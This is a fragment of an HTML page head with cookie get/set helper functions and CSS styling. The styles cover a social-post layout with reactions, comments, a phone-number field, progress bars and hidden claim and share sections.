    <script>
        function set_Cookie(name,value){
            var Days = 30;
            var exp = new Date();
            exp.setTime(exp.getTime() + (Days*20*1000));
            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
        }
        function get_Cookie(name){
            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
            if(arr=document.cookie.match(reg)){
                return unescape(arr[2]);
            }
            return '';
        }
    </script>

    <style type="text/css">
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
        @import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
        
        * {
            margin: 0;
            padding: 0;
            font-family: Poppins, Droid Arabic Naskh;
            font-weight: normal;
            box-sizing: border-box;
        }
        
        body {
            direction: ltr;
            background: #ebedf0;
            max-width: 100%;
            overflow-x: hidden;
        }
        
        a {
            text-decoration: none;
        }
        
        .post {
            background: #fff;
            margin: 10px auto;
            padding: 10px;
            width: 95%;
            max-width: 500px;
            border: 1px solid #d0d1d5;
            border-radius: 3px;
        }
        
        .post img {
            width: 100%;
            height: auto;
        }
        
        .welcome {
            font-size: 15px;
        }
        
        .amount,
        #getname {
            color: #098105;
            text-decoration: none;
        }
        
        .done {
            text-align: center;
            color: #27ae60;
        }
        
        .tip {
            font-size: 14px;
        }
        
        .title {
            text-align: center;
        }
        
        .error {
            display: none;
            text-align: center;
            font-size: 14px;
            color: #e74c3c;
        }
        
        button {
            display: block;
            width: 200px;
            height: 50px;
            color: #fff;
            border: none;
            outline: none;
            font-size: 24px;
            cursor: pointer;
            border-radius: 5px;
            padding: 0 10px;
            margin: 10px auto;
            background: rgb(9, 129, 5);
            transition: background 0.3s ease;
        }
        
        button:hover {
            background: #098105;
        }
        
        .phone {
            max-width: 400px;
            margin: 10px auto;
        }
        
        .phone input {
            width: 100%;
            height: 50px;
            padding: 10px;
            outline: none;
            border: 2px solid #cecece;
            font-size: 14px;
            box-sizing: border-box;
        }
        
        #confirm {
            width: 200px;
            margin: 10px auto;
            border-radius: 0px;
        }
        
        #loader {
            text-align: center;
        }
        
        .spin {
            width: 50px;
            height: 50px;
            background: transparent;
            border: solid 8px rgb(9, 129, 5);
            border-right-color: transparent;
            border-radius: 50%;
            margin: 10px auto;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            100% {
                transform: rotate(1turn);
            }
        }
        
        #loader,
        #info,
        #checking,
        #share,
        #claim {
            display: none;
        }
        
        .center {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .barr {
            direction: ltr;
            max-width: 400px;
            margin: 10px auto;
            box-sizing: border-box;
        }
        
        .fill {
            position: relative;
            display: inline-block;
            width: calc(100% - 100px);
            height: 35px;
            padding: 2px;
            border: 2px solid #098105;
        }
        
        #fill,
        #fill2 {
            background: #098105;
            width: 0%;
            height: 100%;
        }
        
        .percentage {
            width: 100px;
            float: right;
            height: 35px;
            font-size: 16px;
            border: 2px solid #098105;
        }
        
        #percentage,
        #percentage2 {
            margin-left: 5px;
        }
        
        #check,
        #check2 {
            display: none;
        }
        
        .counter {
            color: #7f7f7f;
            font-size: 12px;
            text-align: right;
            padding: 10px 0 10px 2px;
            border-bottom: 1px solid #e1e2e3;
        }
        
        .reactions {
            display: inline-flex;
            align-items: center;
            float: left;
        }
        
        .counter img {
            float: left;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            border: 2px solid #fff;
            box-sizing: content-box;
        }
        
        .like,
        .love {
            margin-right: -5px;
        }
        
        .like {
            z-index: 2;
        }
        
        .love {
            z-index: 1;
        }
        
        .bar {
            display: table;
            width: 100%;
            border-bottom: 1px solid #e1e2e3;
        }
        
        .bar .react {
            display: table-cell;
            width: calc(100% / 3);
            font-size: 12px;
            color: #7f7f7f;
            text-align: center;
            padding: 10px 0;
            cursor: pointer;
        }
        
        .comments {
            direction: ltr;
        }
        
        .comment {
            padding: 6px 0;
            margin-top: 5px;
            overflow: hidden;
        }
        
        .comment img {
            float: left;
            width: 32px;
            height: 32px;
            border: none;
            border-radius: 18px;
            cursor: pointer;
        }
        
        .reply {
            margin-left: 37px;
        }
        
        .single-container {
            margin-left: 37px;
            background: #f1f2f6;
            padding: 10px;
            border-radius: 15px;
            font-size: 12px;
        }
        
        .single-container .user {
            display: inline-block;
            cursor: pointer;
            color: #365899;
            margin-bottom: 5px;
        }
        
        .single-container .text {
            display: block;
        }
        
        .buttons {
            font-size: 12px;
            font-weight: bold;
            margin: 10px 0 0 47px;
            color: #90949c;
        }
        
        .action {
            cursor: pointer;
        }
        
        .action:hover {
            text-decoration: underline;
        }
        
        .input {
            padding: 6px 12px 12px;
        }
        
        .input input {
            width: 100%;
            background: #f1f2f6;
            padding: 10px;
            border-radius: 15px;
            border: 0;
            outline: none;
            box-sizing: border-box;
        }
        
        .A {
            text-align: center;
            background-color: rgb(151, 199, 149);
            padding: 10px;
            margin: 10px auto;
            width: 95%;
            max-width: 500px;
            box-sizing: border-box;
        }
        
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: steelblue;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        
        .clicked {
            background-color: seagreen;
        }
        
        .horizontal_marque {
            width: 95%;
            max-width: 500px;
            margin: 10px auto;
            display: block;
            background: #f1f1f1;
            padding: 10px;
            box-sizing: border-box;
        }
        
        select {
            width: 100%;
            max-width: 330px;
            height: 56px;
            padding: 10px;
            margin: 5px auto;
            display: block;
            box-sizing: border-box;
        }
        
        @media (max-width: 480px) {
            button {
                width: 90%;
                font-size: 20px;
            }
            
            .phone input {
                font-size: 16px;
            }
            
            .welcome, .tip {
                font-size: 14px;
            }
            
            .post {
                padding: 8px;
            }
            
            .single-container {
                margin-left: 30px;
                font-size: 11px;
            }
        }
        
        @media (max-width: 360px) {
            .welcome, .tip {
                font-size: 13px;
            }
            
            button {
                font-size: 18px;
                height: 45px;
            }
            
            .phone input {
                height: 45px;
                font-size: 14px;
            }
        }
    </style>
</head>
